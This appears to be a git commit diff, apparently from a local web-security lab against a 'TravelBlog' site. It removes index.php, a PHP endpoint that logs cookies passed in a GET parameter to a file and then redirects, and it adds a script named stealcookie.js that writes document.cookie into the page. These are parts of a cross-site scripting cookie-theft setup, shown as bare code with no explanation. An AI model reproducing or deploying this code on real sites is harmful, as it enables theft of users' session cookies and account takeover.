d4ab52acb26b1dd339d8518a6d5c2e810eb8f367
DanyalXD <danyal1995@hotmail.co.uk>
2018-04-18 10:23:55 +0100

    text

--- index.php
+++
@@ -1,6 +0,0 @@
-<?php
-$cookies = $_GET["c"];
-$file = fopen('log.text', 'a');
-fwrite($file, $cookies ."\n\n");
-header ('Location:http://192.168.0.41/TravelBlog/search_authors.php');
-?>
---
+++ stealcookie.js
@@ -0,0 +1,1 @@
+document.write("<h1>"+document.cookie+"</h1>");
